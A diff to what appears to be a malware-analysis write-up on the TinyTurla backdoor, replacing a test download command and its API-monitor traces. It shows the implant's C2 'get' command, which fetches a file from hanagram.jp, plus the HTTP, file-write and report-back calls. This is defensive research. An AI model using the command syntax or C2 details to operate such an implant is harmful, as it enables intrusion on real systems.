@@ -268,59 +268,104 @@ As you can see, the malware is forcing the code page 437 (suitable for English /
 
 Second command :  
 
-I've chosen to make the malware download and save a random file from the C2 (here a certificate) through the following order :  
+I've chosen to make the malware download and save a a little poem through the following order :  
 
-get https://hanagram.jp/hanagram.cert toto.cer  
+get https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt Liberty.txt
 
 which triggered the following behavior :  
 
 ```html
-[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0xe4d987c0
+[PAR] LPVOID    lpBuffer              : 0x000000A2E5209960
+[PAR] DWORD     dwNumberOfBytesToRead : 0x4e
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000A2E613FB94
+[RET] 0x7ff90bceb844 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData>
+[PAR] LPCVOID lpBuffer : 0x000000A2E5209960
+[STR]         -> "rsp:get https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt Liberty.txt" <--- command received>
+[RES] BOOL 0x1
+
+[...]
+
+[ * ] [pid 0x250][tid 0x764] c:\windows\system32\svchost.exe
 [API] <WinHttpConnect> in [WINHTTP.dll] 
-[PAR] HINTERNET     hSession       : 0x3e803600
-[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A53F0
+[PAR] HINTERNET     hSession       : 0xe4398b90
+[PAR] LPCWSTR       pswzServerName : 0x000000A2E4DF6EF0
 [STR]               -> "hanagram.jp"
 [PAR] INTERNET_PORT nServerPort    : 443
-[RET] 0x7fff146bbb16 in [tinyturla.dll]
+[RET] 0x7ff90bcebb16 in [tinyturla.dll]
 
-[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[ * ] [pid 0x250][tid 0x764] c:\windows\system32\svchost.exe
 [API] <WinHttpOpenRequest> in [WINHTTP.dll] 
-[PAR] HINTERNET hConnect          : 0x3f66ad90
-[PAR] LPCWSTR   pwszVerb          : 0x000000F4405DF5E8
+[PAR] HINTERNET hConnect          : 0xe4399fc0
+[PAR] LPCWSTR   pwszVerb          : 0x000000A2E61BF978
 [STR]           -> "GET"
-[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F8A5090
-[STR]           -> "/hanagram.cert"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000A2E5209960
+[STR]           -> "/wp/wp-content/The%20New%20Colossus.txt"
 [PAR] LPCWSTR   pwszVersion       : 0x0 (null)
 [PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
 [PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
 [PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
-[RET] 0x7fff146bbc26 in [tinyturla.dll]
+[RET] 0x7ff90bcebc26 in [tinyturla.dll]
 
 [...]
 
-[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[ * ] [pid 0x250][tid 0x764] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0xe4d987c0
+[PAR] LPVOID    lpBuffer              : 0x000000A2E542B6A0
+[PAR] DWORD     dwNumberOfBytesToRead : 0x1000
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000A2E61BFA90
+[RET] 0x7ff90bcec020 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x764] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData>
+[PAR] LPCVOID lpBuffer : 0x000000A2E542B6A0
+[STR]         -> "Not like the brazen giant of Greek fame,"
+[STR]            "With conquering limbs astride from land to land;"
+[STR]            "Here at our sea-washed, sunset gates shall stand"
+[STR]            "A mighty woman with a torch, whose flame"
+[STR]            "Is the imprisoned lightning, and her name"
+[STR]            "Mother of Exiles. From her beacon-hand"
+[STR]            "Glows world-wide welcome; her mild eyes command"
+[STR]            "The air-bridged harbor that twin cities frame."
+[STR]            ""
+[STR]            ""Keep, ancient lands, your storied pomp!" cries she"
+[STR]            "With silent lips. "Give me your tired, your poor,"
+[STR]            "Your huddled masses yearning to breathe free,"
+[STR]            "The wretched refuse of your teeming shore."
+[STR]            "Send these, the homeless, tempest-tost to me,"
+[STR]            "I lift my lamp beside the golden door!""
+[STR]            ""
+[RES] BOOL 0x1
+
+[...]
+
+[ * ] [pid 0x250][tid 0x764] c:\windows\system32\svchost.exe
 [API] <CreateFileA> in [KERNEL32.DLL] 
-[PAR] LPCTSTR lpFileName            : 0x000000F43F3BCD30
-[STR]         -> "toto.cer"
+[PAR] LPCTSTR lpFileName            : 0x000000A2E520E100
+[STR]         -> "Liberty.txt"
 [PAR] DWORD   dwDesiredAccess       : 0x40000000 (GENERIC_WRITE)
 [PAR] DWORD   dwCreationDisposition : 0x2 (CREATE_ALWAYS)
-[RET] 0x7fff146b6a18 in [tinyturla.dll]
+[RET] 0x7ff90bce6a18 in [tinyturla.dll]
 
-[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[ * ] [pid 0x250][tid 0x764] c:\windows\system32\svchost.exe
 [EVT] [Kernel Monitoring]
-[MSG] [FILE_CREATED] [toto.cer]
+[MSG] [FILE_CREATED] [Liberty.txt]
 
-[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[ * ] [pid 0x250][tid 0x764] c:\windows\system32\svchost.exe
 [API] <WriteFile> in [KERNEL32.DLL] 
-[PAR] HANDLE hFile                 : 0x47c
-[PAR] LPVOID lpBuffer              : 0x000000F43F2D7AD0
-[PAR] DWORD  nNumberOfBytesToWrite : 0x505
-[RET] 0x7fff146b6a45 in [tinyturla.dll]
+[PAR] HANDLE       hFile                  : 0xa04
+[PAR] LPVOID       lpBuffer               : 0x000000A2E43642C0
+[PAR] DWORD        nNumberOfBytesToWrite  : 0x27b
+[PAR] LPDWORD      lpNumberOfBytesWritten : 0x000000A2E61BFB40
+[PAR] LPOVERLAPPED lpOverlapped           : 0x0
+[RET] 0x7ff90bce6a45 in [tinyturla.dll]
 
-[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
-[API] <CloseHandle> in [KERNEL32.DLL] 
-[PAR] HANDLE hObject    : 0x47c
-[RET] 0x7fff146b6abf in [tinyturla.dll]
 ```
 
 Once the file download succesfuly, the malware reports back to the C2 :  
@@ -371,7 +416,7 @@ Once the file download succesfuly, the malware reports back to the C2 :
 [STR]              "Content-Disposition: form-data;name="result""
 [STR]              "Content-Type: text/plain"
 [STR]              ""
-[STR]              "[+] File https://hanagram.jp/hanagram.cert loaded and saved in toto.cer" <--- success>
+[STR]              "[+] File https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt loaded and saved in Liberty.txt" <--- success>
 [STR]              ""
 [STR]              "-----"
 [PAR] DWORD     dwNumberOfBytesToWrite   : 0xfa
